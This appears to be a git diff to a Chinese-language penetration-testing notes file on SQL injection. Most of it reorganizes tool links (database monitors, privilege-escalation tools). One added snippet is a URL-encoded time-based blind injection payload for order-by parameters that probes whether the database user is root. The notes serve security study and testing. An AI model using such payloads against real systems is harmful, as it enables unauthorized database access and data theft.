@@ -37,10 +37,9 @@
 - https://juice-shop.herokuapp.com/#/search
 - https://sqlchop.chaitin.cn/demo/
 
-**辅助工具**
+**相关工具**
 - sqlmap
     - [sqlmap 笔记](../../../安全工具/Sqlmap.md)
-- [TheKingOfDuck/MySQLMonitor](https://github.com/TheKingOfDuck/MySQLMonitor) - MySQL 实时监控工具(代码审计/黑盒/白盒审计辅助工具)
 
 **提权工具**
 - [SafeGroceryStore/MDUT](https://github.com/SafeGroceryStore/MDUT) - 数据库跨平台利用工具
@@ -206,10 +205,16 @@
 **资源**
 - [aleenzz/MSSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)
 
+**监控工具**
+- [TheKingOfDuck/MySQLMonitor](https://github.com/TheKingOfDuck/MySQLMonitor) - MySQL 实时监控工具(代码审计/黑盒/白盒审计辅助工具)
+    ```
+    java -jar MySQLMonitor.jar -h 127.0.0.1 -user test -pass test
+    ```
+- [cw1997/MySQL-Monitor](https://github.com/cw1997/MySQL-Monitor) - MySQL服务器执行SQL记录实时监控（WEB版本）
+
 ### MySQL 基础
 
-- [Mysql函数](../../../../Integrated/数据库/笔记/Mysql函数.md)
-- [Mysql常用语句](../../../../Integrated/数据库/笔记/Mysql常用语句.md)
+- [MySQL](../../../../Integrated/数据库/笔记/MySQL.md)
 
 **注释**
 
@@ -298,6 +303,11 @@ UNION SELECT IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false
 ```
 
 **order by 后的注入**
+
+简单判断
+```
+order=1%20and(select%20if(mid(user(),1,4)=%22root%22,sleep(0.01),123))
+```
 
 order by 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 order 或者 order by 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：
 ```sql
@@ -652,6 +662,8 @@ select JSON_ARRAY_APPEND('[1,2]',version(),1);
 - [Keramas/mssqli-duet](https://github.com/Keramas/mssqli-duet) - SQL injection script for MSSQL that extracts domain users from an Active Directory environment based on RID bruteforcing
 
 ### MSSQL 基础
+
+- [MSSQL](../../../../Integrated/数据库/笔记/MSSQL.md)
 
 **基本参数**
 ```sql
